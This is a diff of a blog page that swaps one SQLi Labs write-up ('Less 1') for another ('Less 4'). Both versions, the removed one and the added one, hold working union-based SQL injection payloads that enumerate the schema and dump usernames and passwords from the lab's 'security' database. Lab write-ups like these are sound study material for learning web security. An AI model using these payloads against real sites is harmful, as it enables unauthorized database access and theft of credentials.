@@ -129,18 +129,18 @@
 
 
 
-<meta name="description" content="I test ?id=1&amp;#39;, then return a error message showing that the SQL statement using single quotes so I change the SQL statement to ?id=1&amp;#39; %23, it runs normally then test ?id=1&amp;#39; union select 1">
+<meta name="description" content="I test ?id=1&amp;#39;, it runs normally so I change the SQL to ?id=1&amp;quot;, it returns a error message showing that the server uses a double quote and a bracket so I change my payload to ?id=-1&amp;quot;) un">
 <meta name="keywords" content="SQL Injection,SQLi Labs">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Less 1">
-<meta property="og:url" content="https://busydebug.github.io/2017/12/11/Less-1/index.html">
+<meta property="og:title" content="Less 4">
+<meta property="og:url" content="https://busydebug.github.io/2017/12/12/Less-4/index.html">
 <meta property="og:site_name" content="busydebug">
-<meta property="og:description" content="I test ?id=1&amp;#39;, then return a error message showing that the SQL statement using single quotes so I change the SQL statement to ?id=1&amp;#39; %23, it runs normally then test ?id=1&amp;#39; union select 1">
+<meta property="og:description" content="I test ?id=1&amp;#39;, it runs normally so I change the SQL to ?id=1&amp;quot;, it returns a error message showing that the server uses a double quote and a bracket so I change my payload to ?id=-1&amp;quot;) un">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2017-12-12T13:03:49.017Z">
+<meta property="og:updated_time" content="2017-12-12T13:59:42.915Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Less 1">
-<meta name="twitter:description" content="I test ?id=1&amp;#39;, then return a error message showing that the SQL statement using single quotes so I change the SQL statement to ?id=1&amp;#39; %23, it runs normally then test ?id=1&amp;#39; union select 1">
+<meta name="twitter:title" content="Less 4">
+<meta name="twitter:description" content="I test ?id=1&amp;#39;, it runs normally so I change the SQL to ?id=1&amp;quot;, it returns a error message showing that the server uses a double quote and a bracket so I change my payload to ?id=-1&amp;quot;) un">
 
 
 
@@ -170,13 +170,13 @@
 
 
 
-  <link rel="canonical" href="https://busydebug.github.io/2017/12/11/Less-1/"/>
+  <link rel="canonical" href="https://busydebug.github.io/2017/12/12/Less-4/"/>
 
 
 
 
 
-  <title>Less 1 | busydebug</title>
+  <title>Less 4 | busydebug</title>
   
 
 
@@ -303,7 +303,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://busydebug.github.io/2017/12/11/Less-1/">
+    <link itemprop="mainEntityOfPage" href="https://busydebug.github.io/2017/12/12/Less-4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="busydebug">
@@ -320,7 +320,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Less 1</h1>
+          <h1 class="post-title" itemprop="name headline">Less 4</h1>
         
 
         <div class="post-meta">
@@ -332,8 +332,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-11T22:49:32+08:00">
-                2017-12-11
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-12T21:56:44+08:00">
+                2017-12-12
               </time>
             
 
@@ -404,16 +404,9 @@
 
       
         <ul>
-<li>I test <code>?id=1&#39;</code>, then return a error message showing that the SQL statement using single quotes</li>
-<li>so I change the SQL statement to <code>?id=1&#39; %23</code>, it runs normally</li>
-<li>then test <code>?id=1&#39; union select 1,2,3 %23</code>, but return nothing useful</li>
-<li>because id is valid so the union statement cannot run, so I change the SQL statement to <code>?id=-1&#39; union select 1,2,3 %23</code>, yeah, it return different data, we can see that the server just uses position 2 and 3</li>
-<li>let me try more useful SQL , <code>?id=-1&#39; union select 1,user(),database() %23</code>, we can see that we get the user name and database name</li>
-<li>using database name we can get its tables name through inner database <strong>information_schema</strong></li>
-<li>try <code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; %23</code>, we get tables name of database <strong>security</strong></li>
-<li>to get more data, we can try getting data from table <strong>users</strong>, <code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; %23</code>, we get columns name of table users in database <strong>security</strong></li>
-<li>finally we use <code>?id=-1&#39; union select 1,group_concat(username, &#39;:&#39;),group_concat(password, &#39;:&#39;) from security.users %23</code>, we get all username and password</li>
-<li>I just make notes so I don’t explain clearly, I’m sorry</li>
+<li>I test <code>?id=1&#39;</code>, it runs normally</li>
+<li>so I change the SQL to <code>?id=1&quot;</code>, it returns a error message showing that the server uses a double quote and a bracket</li>
+<li>so I change my payload to <code>?id=-1&quot;) union select 1,group_concat(username, &#39;:&#39;),group_concat(password, &#39;:&#39;) from security.users %23</code></li>
 </ul>
 
       
@@ -447,8 +440,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/12/11/Two-Sum/" rel="next" title="Two Sum">
-                <i class="fa fa-chevron-left"></i> Two Sum
+              <a href="/2017/12/12/Less-3/" rel="next" title="Less 3">
+                <i class="fa fa-chevron-left"></i> Less 3
               </a>
             
           </div>
@@ -456,10 +449,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/12/12/Add-Two-Numbers/" rel="prev" title="Add Two Numbers">
-                Add Two Numbers <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
